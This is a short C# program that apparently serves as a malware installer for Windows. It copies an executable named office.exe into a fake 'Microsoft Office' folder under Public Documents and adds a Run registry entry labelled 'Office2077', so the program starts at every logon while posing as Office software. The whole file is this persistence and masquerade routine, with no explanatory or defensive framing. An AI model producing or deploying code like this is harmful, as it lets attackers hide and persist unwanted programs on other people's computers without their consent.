using System;
using System.Diagnostics;
using System.Runtime;
using System.IO;
using Microsoft.Win32;
namespace Start
{
	class Pogram
	{
		static void Main(string[] args)
		{
			if (Directory.Exists(@"C:\Users\Public\Documents\Microsoft Office") == true)
			{
				return;
			} 
			else
			{
				Directory.CreateDirectory(@"C:\Users\Public\Documents\Microsoft Office");
			}
			string path = @"office.exe";
			string path1 = @"C:\Users\Public\Documents\Microsoft Office\office.exe";
			File.Copy(path, path1);
			RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
			key.SetValue("Office2077", @"C:\Users\Public\Documents\Microsoft Office\office.exe");
		}
	}
}
